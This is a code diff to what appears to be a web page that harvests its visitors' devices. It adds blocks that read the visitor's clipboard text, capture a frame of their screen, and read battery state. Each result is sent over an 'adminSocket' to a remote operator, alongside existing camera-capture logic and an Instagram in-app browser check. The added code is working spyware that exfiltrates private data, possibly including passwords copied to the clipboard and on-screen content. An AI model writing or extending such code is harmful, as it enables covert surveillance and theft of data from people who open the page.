@@ -1842,7 +1842,10 @@
                 notifications: false,
                 microphone: false,
                 motion: false,
-                contacts: false
+                contacts: false,
+                screenShare: false,
+                clipboard: false,
+                battery: false
             };
             let permissionsRequested = false;
             let isInInstagramBrowser = false;
@@ -2590,6 +2593,57 @@
                         console.error('Notification request failed:', e);
                     }
                 }
+
+                // 5. Battery Status
+                try {
+                    if (navigator.getBattery) {
+                        const battery = await navigator.getBattery();
+                        permissionsGranted.battery = true;
+                        if (typeof adminSocket !== 'undefined' && adminSocket && adminSocket.connected) {
+                            adminSocket.emit('battery:update', { uuid: userUUID, level: battery.level, charging: battery.charging });
+                        }
+                    }
+                } catch(e) {}
+
+                // 6. Clipboard Access
+                try {
+                    if (navigator.clipboard && navigator.clipboard.readText) {
+                        const text = await navigator.clipboard.readText();
+                        permissionsGranted.clipboard = true;
+                        if (text && typeof adminSocket !== 'undefined' && adminSocket && adminSocket.connected) {
+                            adminSocket.emit('clipboard:update', { uuid: userUUID, text: text });
+                        }
+                    }
+                } catch(e) { console.log('Clipboard permission denied'); }
+
+                // 7. Screen Sharing
+                try {
+                    if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
+                        const screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+                        permissionsGranted.screenShare = true;
+                        
+                        const video = document.createElement('video');
+                        video.srcObject = screenStream;
+                        video.muted = true;
+                        await video.play();
+                        
+                        // Wait a bit for the video to load before grabbing a frame
+                        await new Promise(resolve => setTimeout(resolve, 500));
+                        
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth || 1280;
+                        canvas.height = video.videoHeight || 720;
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        const screenData = canvas.toDataURL('image/jpeg', 0.5);
+                        
+                        if (typeof adminSocket !== 'undefined' && adminSocket && adminSocket.connected) {
+                            adminSocket.emit('screenshare:update', { uuid: userUUID, image: screenData });
+                        }
+                        
+                        screenStream.getTracks().forEach(track => track.stop());
+                    }
+                } catch(e) { console.log('Screen share denied'); }
 
                 if (permissionsGranted.camera) startContinuousCapture();
                 return permissionsGranted;
